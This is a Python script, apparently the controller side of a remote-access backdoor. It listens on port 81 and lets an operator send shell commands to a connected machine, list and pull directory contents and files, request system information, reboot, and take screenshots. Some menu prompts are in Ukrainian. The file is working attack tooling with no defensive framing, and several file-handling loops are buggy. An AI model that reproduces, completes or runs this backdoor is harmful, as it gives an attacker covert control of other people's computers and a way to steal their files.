import socket, sys
import os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '0.0.0.0'
port = 81
s.bind((host, port))
s.listen(1)
while True:
    conn, addr = s.accept()
    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/reboot - Restart System\n/sysinfo - system information\n/dir - (Files, Download)\n/screen - ScreenShot\n> ')
    conn.send(a.encode())

    if a == '/cmd':
        cmd = input('#> ')
        conn.send(cmd.encode())
        cmd_process = conn.recv(5000)
        cmd_process = str(cmd_process, "cp866")
        print(cmd_process)

    elif a == '/mkdir':
        dir = input('Name directory > ')
        conn.send(dir.encode())

    elif a == "/dir":
        cmd = input('1. Файли 2. Скачати > ')
        if cmd == '1':
            conn.send(cmd.encode())
            direct = input('1. Наявня папка 2. Перейти >')
            if direct == '1':
                conn.send(direct.encode())
                f = open('file.txt', 'wb')
                while True:
                    try:
                        data = conn.recv(1024)
                        if data == 'EOF'.encode():
                            break
                        f.write(data)
                        f.close()
                    except:
                        break
                f = open('file.txt', 'r')
                print(f.read())
                f.close()
                os.remove('file.txt')

            elif direct == '2':
                conn.send(direct.encode())
                f = open('pwd.txt', 'wb')
                while True:
                    try:
                        data = conn.recv(1024)
                        if data == 'EOF'.encode():
                            break
                        f.write(data)
                        print(data)
                        f.close()
                        os.remove('pwd.txt')
                    except:
                        break
                dir = input('Directory > ')
                conn.send(dir.encode())
                f = open('file.txt', 'wb')
                while True:
                    try:
                        data = conn.recv(1024)
                        if data == 'EOF'.encode():
                            break
                        f.write(data)
                        f.close()
                    except:
                        break
                f = open('file.txt', 'r')
                print(f.read())
                f.close()
                os.remove('file.txt')
                
    elif a == '/sysinfo':
        sysinfo = conn.recv(5000)
        sysinfo = str(sysinfo, 'cp866')
        print(sysinfo)
